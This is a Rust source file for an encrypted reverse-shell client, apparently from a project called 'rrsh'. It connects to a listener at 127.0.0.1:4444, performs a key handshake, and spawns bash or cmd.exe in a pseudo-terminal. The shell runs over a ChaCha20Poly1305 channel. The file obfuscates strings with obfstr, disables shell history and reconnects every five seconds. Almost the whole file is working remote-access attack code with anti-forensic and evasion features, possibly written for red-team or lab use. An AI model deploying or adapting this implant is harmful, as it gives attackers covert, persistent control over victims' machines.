use futures::{SinkExt, StreamExt};
use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
use std::io::{Read, Write};
use std::time::Duration;
use tokio::net::TcpStream as TokioTcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};

use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use obfstr::obfstr;

mod codec;
use codec::EncryptedCodec;
use rrsh::{HandshakeRole, do_handshake};

#[tokio::main]
async fn main() {
    loop {
        tokio::select! {
            result = reverse_shell() => {
                match result {
                    Ok(_) => {
                        println!("[*] Reverse shell session ended normally.");
                    }
                    Err(e) => {
                        eprintln!("[!] Reverse shell session error: {}", e);
                    }
                }
            }

            _ = tokio::signal::ctrl_c() => {
                println!("\r\n[!] Ctrl-C received, exiting.");
                break;
            }
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

struct PtySession {
    pty_pair: portable_pty::PtyPair,
    child: Box<dyn portable_pty::Child + Send + Sync>,
}

impl PtySession {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let pty_system = NativePtySystem::default();
        // TODO: For this, we would need a custom signaling protocol - we might look at this later
        let pty_pair = pty_system
            .openpty(PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| format!("failed to create pty: {}", e))?;

        let mut _cmd;

        #[cfg(not(target_os = "windows"))]
        {
            _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
            _cmd.env_clear();
            _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
            _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
            _cmd.env(obfstr!("HISTFILESIZE"), "0");
            _cmd.env(obfstr!("HISTSIZE"), "0");
        }

        #[cfg(target_os = "windows")]
        {
            _cmd = CommandBuilder::new(obfstr!("cmd.exe"));
            _cmd.env(obfstr!("PROMPT"), obfstr!("[V] $P$G "));
        }

        let _sh = pty_pair
            .slave
            .spawn_command(_cmd)
            .map_err(|e| format!("failed to spawn: {}", e))?;

        Ok(Self {
            pty_pair,
            child: _sh,
        })
    }
}

impl Drop for PtySession {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = TokioTcpStream::connect(obfstr!("127.0.0.1:4444")).await?;
    let client_role = HandshakeRole::Client {
        server_public_key: x25519_dalek::PublicKey::from([
            152, 243, 212, 54, 136, 190, 128, 28, 24, 202, 202, 176, 95, 52, 236, 69, 218, 35, 112,
            10, 137, 101, 212, 224, 14, 168, 82, 49, 127, 203, 238, 105,
        ]),
    };
    let (key_rx, key_tx) = do_handshake(&mut stream, client_role).await?;

    let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_tx)
        .map_err(|e| format!("cipher init error: {}", e))?;
    let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_rx)
        .map_err(|e| format!("cipher init error: {}", e))?;

    let (tcp_reader, tcp_writer) = tokio::io::split(stream);
    let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
    let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));

    let shell = PtySession::new().map_err(|e| format!("failed to start shell: {}", e))?;

    let mut pty_reader = shell.pty_pair.master.try_clone_reader()?;
    let mut pty_writer = shell.pty_pair.master.take_writer()?;

    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);

    tokio::task::spawn_blocking(move || {
        // This is actually suboptimial and I only need this because of
        // the sync interface of portable-pty - this is good for potential Windows
        // support though...
        let mut buf = [0u8; 4096];
        loop {
            match pty_reader.read(&mut buf) {
                Ok(n) if n > 0 => {
                    // Send the data to the other thread
                    let _ = tx.blocking_send(buf[..n].to_vec());
                }
                _ => break,
            }
        }
    });

    loop {
        tokio::select! {
            Some(result) = frame_reader.next() => {
                match result {
                    Ok(data) => {
                        pty_writer.write_all(&data)?;
                        pty_writer.flush()?;
                    }
                    Err(e) => {
                        return Err(format!("network error: {}", e).into());
                    }
                }
            }

            Some(data) = rx.recv() => {
                if let Err(e) = frame_writer.send(data).await {
                    return Err(format!("failed to send: {}", e).into());
                }
            }

            else => break,
        }
    }

    Ok(())
}
